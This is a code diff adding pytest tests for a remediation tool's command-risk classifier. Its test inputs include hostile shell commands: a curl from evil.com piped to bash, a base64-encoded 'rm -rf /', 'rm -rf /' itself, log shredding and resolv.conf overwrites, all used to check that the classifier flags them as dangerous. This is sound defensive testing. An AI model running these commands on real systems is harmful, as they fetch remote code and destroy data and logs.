@@ -234,3 +234,41 @@ def test_remediation_zero_execution_hooks():
     assert len(actions) >= 1
     for a in actions:
         assert "ADVISORY ONLY" in a.advisory_warning
+
+
+def test_remediation_risk_classifier_rejects_all_audit_bypasses():
+    """Verify allowlist classifier rejects all shell chaining, subshells, and encoded commands (SEC-02)."""
+    bypass_cases = [
+        ("curl -s https://evil.com/setup.sh | bash", RiskLevel.DANGEROUS),
+        ("python3 -c \"import os; os.system('curl http://malicious.com')\"", RiskLevel.DANGEROUS),
+        ("bash -c '$(echo cm0gLXJmIC8= | base64 -d)'", RiskLevel.DANGEROUS),
+        ("kubectl get pods && dangerous_script.sh", RiskLevel.DANGEROUS),
+        ("aws ec2 terminate-instances --instance-ids i-12345", RiskLevel.DANGEROUS),
+        ("helm uninstall my-release", RiskLevel.DANGEROUS),
+        ("> /etc/resolv.conf", RiskLevel.DANGEROUS),
+        ("rm -rf /", RiskLevel.DANGEROUS),
+        ("apt-get remove --purge nginx", RiskLevel.DANGEROUS),
+        ("shred -u /var/log/syslog", RiskLevel.DANGEROUS),
+        ("docker kill my-container", RiskLevel.MODERATE),
+    ]
+    for cmd, expected_risk in bypass_cases:
+        actual_risk = RemediationAdvisor.classify_command_risk(cmd, proposed_risk=RiskLevel.SAFE)
+        assert actual_risk == expected_risk, (
+            f"Command '{cmd}' classified as {actual_risk.value}, expected {expected_risk.value}"
+        )
+
+
+def test_remediation_unapproved_command_never_defaults_to_safe():
+    """Verify unknown commands never receive SAFE classification, defaulting to MODERATE (SEC-02)."""
+    unknown_cmds = [
+        "custom_debug_tool --component=web",
+        "helm status my-release",
+        "systemctl status nginx",
+        "my_healthcheck.sh",
+    ]
+    for cmd in unknown_cmds:
+        # Proposing SAFE for unapproved command MUST elevate to MODERATE
+        assert (
+            RemediationAdvisor.classify_command_risk(cmd, proposed_risk=RiskLevel.SAFE)
+            == RiskLevel.MODERATE
+        )
